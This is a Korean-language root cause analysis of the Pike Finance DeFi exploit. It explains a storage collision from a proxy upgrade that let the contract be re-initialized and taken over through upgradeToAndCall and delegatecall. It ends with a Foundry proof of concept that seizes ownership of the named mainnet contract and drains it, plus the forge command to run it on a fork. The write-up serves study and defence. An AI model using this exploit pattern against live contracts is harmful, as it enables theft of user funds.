# Pike Finance Exploit Root Cause Analysis

### 이재영(Finder)

### 목차
1. Pike Finance란
2. Root Cause 분석
3. PoC


## 1. Pike Finance란
Pike Finance란 크로스체인 기능을 제공하는 분산형 금융 대출 프로토콜입니다.

## 2. Root Cause 분석
```
공격자 주소 : 0x19066f7431df29a0910d287c8822936bb7d89e23
익스플로잇 컨트랙트 : 0x1da4bc596bfb1087f2f7999b0340fcba03c47fbd
피해자 컨트랙트 : 0xfc7599cffea9de127a9f9c748ccb451a34d2f063
공격 트랜잭션 : 0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431
```
이 공격은 1차 공격과 2차 공격으로 나뉘며 약 190만달러 원화로 27억 3,889만 원정도 되는 피해를 입혔습니다.
이 공격은 1차 공격에 대응을 하면서 생긴 취약점으로 인해 2차 공격까지 생긴 케이스입니다.
먼저 첫 번째 공격부터 알아보겠습니다 첫 번째 공격에선 30만 달러를 탈취당했습니다.
이 공격은 CCTP(Cross Chain Transfer Protocol)를 사용하여 USDC 전송을 하는 과정에서 발생한 취약점이고
USDC 전송 중 수신자의 주소와 금액을 조작을 할수있는 취약점에 의하여 1차 공격이 진행되었습니다.
해당 공격에 대응하기 위해 컨트랙트를 업데이트 해야 하지만 스마트컨트랙트의 특성상 해당 코드를 직접적으로 수정이 불가
하기에
프록시 컨트랙트를 사용하여 코드를 업데이트했지만 이 업데이트에서 취약점이 터집니다.
업데이트전 컨트랙트의 스토리지 레이아웃입니다.
```sol
uint256 _isActive; // STORAGE[0x0]
uint256 _chainProtocolReserves; // STORAGE[0x6]
mapping (address => bool) _allowedTokens; // STORAGE[0x7]
uint256 stor_a; // STORAGE[0xa]
uint8 stor_b_0_0; // STORAGE[0xb] bytes 0 to 0
bool _initialize; // STORAGE[0xb] bytes 1 to 1
address _gateway; // STORAGE[0x1] bytes 0 to 19
address _hubGateway; // STORAGE[0x2] bytes 0 to 19
address _endpoint; // STORAGE[0x3] bytes 0 to 19
address _cctpChannel; // STORAGE[0x4] bytes 0 to 19
address _usdcTokenAddress; // STORAGE[0x8] bytes 0 to 19
address _nativeAsset; // STORAGE[0x9] bytes 0 to 19
bool stor_4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143_0_0; // STORAGE[0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143] bytes 0 to 0
address _upgradeTo; // STORAGE[0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc] bytes 0 to 19
```
업데이트 후 스토리지 레이아웃입니다.
```sol
uint256 _isActive; // STORAGE[0x0]
uint256 _chainProtocolReserves; // STORAGE[0x6]
mapping (address => bool) _allowedTokens; // STORAGE[0x7]
uint256 stor_a; // STORAGE[0xa]
bool _paused; // STORAGE[0xb] bytes 0 to 0
uint8 stor_b_1_1; // STORAGE[0xb] bytes 1 to 1
bool _initialize; // STORAGE[0xb] bytes 2 to 2
address _gateway; // STORAGE[0x1] bytes 0 to 19
address _hubGateway; // STORAGE[0x2] bytes 0 to 19
address _endpoint; // STORAGE[0x3] bytes 0 to 19
address _cctpChannel; // STORAGE[0x4] bytes 0 to 19
address _usdcTokenAddress; // STORAGE[0x8] bytes 0 to 19
address _nativeAsset; // STORAGE[0x9] bytes 0 to 19
bool stor_4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143_0_0; // STORAGE[0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143] bytes 0 to 0
address _upgradeTo; // STORAGE[0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc] bytes 0 to 19
```
이 두 메모리 레이아웃을 비교해보면 11번째 슬롯에 bool _paused;이 추가되어 11번 슬롯에서 오프셋이 하나씩 뒤로 밀리는걸 볼 수 있습니다.
이 취약점을 storage collision이라고 부릅니다 이 취약점으로 인해 영향을 받은 함수는 initialize 함수입니다.
```
function initialize(address _owner, address _WNativeAddress, address _uniswapHelperAddress, address tokenAddress, uint16 _swapFee, uint16 _withdrawFee) public nonPayable { 
    require(msg.data.length - 4 >= 192);
    v0 = _initialize;
    v1 = v2 = !v0;
    if (!_initialize) {
        v1 = v3 = stor_b_0_0 < 1;
    }
    if (!v1) {
        v1 = v4 = !this.code.size;
        if (!bool(this.code.size)) {
            v1 = 1 == stor_b_0_0;
        }
    }
    require(v1, Error('Initializable: contract is already initialized'));
    stor_b_0_0 = 1;
    if (!_initialize) {
        _initialize = 1;
    }
    _gateway = _owner;
    _hubGateway = _WNativeAddress;
    _endpoint = _uniswapHelperAddress;
    _cctpChannel = tokenAddress;
    _isActive = 0x1 | (bytes31(msg.sender << 40) | 0xffffffffffffff0000000000000000000000000000000000000000ffffffff00 & (_withdrawFee << 24 | (0xffffffffffffffffffffffffffffffffffffffffffffffffffffff0000ffffff & _swapFee << 8 | _isActive & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000ff)));
    _nativeAsset = 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee;
    if (!_initialize) {
        _initialize = 0;
        emit Initialized(1);
    }
}
```
이 코드는 initialize함수의 구현체 입니다.
이 코드에서 변수 stor_b_1_1 의 값에 따라서 초기화를 결정합니다 하지만 위에서 봤던 
``` sol
    v0 = _initialize;
    v1 = v2 = !v0;
    if (!_initialize) {
        v1 = v3 = stor_b_1_1 < 1;
    }
```
이 조건문을 보게되면 stor_b_1_1의 값이 0일때 초기화가 되었다고 간주합니다.
```sol
    require(v1, Error('Initializable: contract is already initialized'));
    stor_b_1_1 = 1;
    if (!_initialize) {
        _initialize = 1;
    }
```
또한 이 부분을 보게된다면 stor_b_1_1을 1로 선언하여 재사용을 방지하고있습니다.
하지만  위에서 살펴보았던 storage collision취약점으로 인하여 재사용이 가능하게됩니다.
업그레이드 전엔 초기화 함수가 11번슬롯의 1번째 바이트에 저장장됩니다.
```
uint8 stor_b_0_0; // STORAGE[0xb] bytes 0 to 0
bool _initialize; // STORAGE[0xb] bytes 1 to 1
```
업그레이트 후엔 초기화 함수가 2번째 바이트에 저장되었습니다.
```
bool _paused; // STORAGE[0xb] bytes 0 to 0
uint8 stor_b_1_1; // STORAGE[0xb] bytes 1 to 1
bool _initialize; // STORAGE[0xb] bytes 2 to 2
```
즉 업그레이드후 storage collision으로인해 initialize의값이초기화되지않은상태가되고 stor_b_1_1 또한이전슬롯의오프셋에있던 bool _initialize와자료형이다르기때문에값이초기화되지않음으로초기화함수를한번더호출이가능해집니다. 초기화함수를한번더실행된다면  _isActive의값에관리자의주소 msg.sender을상위 40비트에저장하게된다즉공격자의트랜잭션으로초기화를하고 admin함수를호출한다면공격자의주소가 onwer가됩니다공격자는 upgradeToAndCall을사용하여악성컨트랙트를사용하여자금을탈취했습니다.
```sol
function upgradeToAndCall(address newImplementation, bytes data) public payable { 
    require(msg.data.length - 4 >= 64);
    require(data <= uint64.max);
    require(4 + data + 31 < msg.data.length);
    require(data.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
    v0 = new bytes[](data.length);
    require(!((v0 + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0 & 32 + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0 & data.length + 31) + 31) < v0) | (v0 + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0 & 32 + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0 & data.length + 31) + 31) > uint64.max)), Panic(65)); // failed memory allocation (too much memory)
    require(4 + data + data.length + 32 <= msg.data.length);
    CALLDATACOPY(v0.data, data.data, data.length);
    v0[data.length] = 0;
    require(this - address(0xd167a1893e8f108572826dabae19663a9131b0c2), Error('Function must be called through delegatecall'));
    require(_upgradeTo == address(0xd167a1893e8f108572826dabae19663a9131b0c2), Error('Function must be called through active proxy'));
    require(msg.sender == address(_isActive >> 40), CallerNotAuthorized());
    0x1692(1, v0, newImplementation);
}
```
upgradeToAndCall을 호출하면 _isActive  주소와 동일한지 확인하는 로직이 존재하는데 이미 초기화를 하면서 _isActive를 공격자의 주소로 설정하였기에  0x1692함수를 호출합니다.
```sol
function 0x1692(uint256 varg0, bytes varg1, uint256 varg2) private { 
    if (!stor_4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143_0_0) {
        v0 = v1, /* uint256 */ v2 = address(varg2).proxiableUUID().gas(msg.gas);
        if (v1) {
            require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
            v0 = v3 = 1;
        }
        require(v0, Error('ERC1967Upgrade: new implementation is not UUPS'));
        require(v2 == 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, Error('ERC1967Upgrade: unsupported proxiableUUID'));
        0x2c42(v2, v2, v2);
        return ;
    } else {
        0x2ba6(varg2);
        return ;
    }
}
```
proxiableUUID를 호출하여 리턴값이 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc 와 같은지 확인하고 함수 0x2c42를 호출합니다 .

```
function 0x2c42(uint256 varg0, uint256 varg1, uint256 varg2) private { 
    0x2ba6(varg2);
    emit Upgraded(address(varg2));
    varg0 = v0 = MEM[varg1] > 0;
    if (!varg0) {
        return ;
    } else {
        v1 = v2 = 0;
        while (v1 >= MEM[varg1]) {
            MEM[v1 + MEM[64]] = MEM[v1 + (varg1 + 32)];
            v1 += 32;
        }
        MEM[MEM[varg1] + MEM[64]] = 0;
        v3, /* uint256 */ v4, /* uint256 */ v5 = address(varg2).delegatecall(MEM[MEM[64]:MEM[64] + MEM[v2c42arg0x1] + MEM[64] - MEM[64]], MEM[MEM[64]:MEM[64]]).gas(msg.gas);
        if (RETURNDATASIZE() == 0) {
            v6 = v7 = 96;
        } else {
            v6 = v8 = new bytes[](RETURNDATASIZE());
            RETURNDATACOPY(v8.data, 0, RETURNDATASIZE());
        }
        if (!v3) {
            require(!MEM[v6], v5, MEM[v6]);
            v9 = new bytes[](v10.length);
            v11 = v12 = 0;
            while (v11 >= v10.length) {
                v9[v11] = v10[v11];
                v11 += 32;
            }
            v9[v10.length] = 0;
            revert(Error(v9));
        } else {
            if (!(0 - MEM[v6])) {
                require((address(varg2)).code.size, Error('Address: call to non-contract'));
            }
            return ;
        }
    }
}
```
이 함수에선 newImplementation의 주소로 delegatecall을 수행합니다 delegatecall로 받아오는 정보는 upgradeToAndCall의 data를 사용합니다.즉 _isActive 변수에 공격자의 정보가 담겨있음으로 upgradeToAndCall을 수행을 할 수 있게되고 delegatecall로 호출을 진행하기에 피해자 컨트랙트를 복사해 와서 공격자 컨트랙트에서 실행하는것과 같은 원리가 되므로 피해자 컨트랙트의 자금을 모두 탈취할 수 있게되는 취약점입니다.
## PoC
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPikeFinance {
    function initialize(address, address, address, address, uint16, uint16) external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract Poc is Test {
    uint256 private constant FORK_BLOCK = 19771058;
    address private constant TARGET_CONTRACT = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function setUp() public {
        vm.deal(address(this), 0);
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
    }

    function testExploit() public {
        address attacker = address(this);
        address wNative = address(this);
        address dexHelper = address(this);
        address token = address(this);

        IPikeFinance(TARGET_CONTRACT).initialize(attacker, wNative, dexHelper, token, 20, 20);

        IPikeFinance(TARGET_CONTRACT).upgradeToAndCall(address(this), abi.encodeWithSignature("drainFunds(address)", address(this)));
    }

    function drainFunds(address recipient) external {
        payable(recipient).call{value: address(this).balance}("");
    }

    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}
```
아래 명령어로 실행해볼 수 있습니다<br>
`forge test --fork-url https://eth.llamarpc.com --fork-block-number 19771058 --match-test testExploit -vvvv`
![exploit](./assets/img/pikeFinance/image.png)
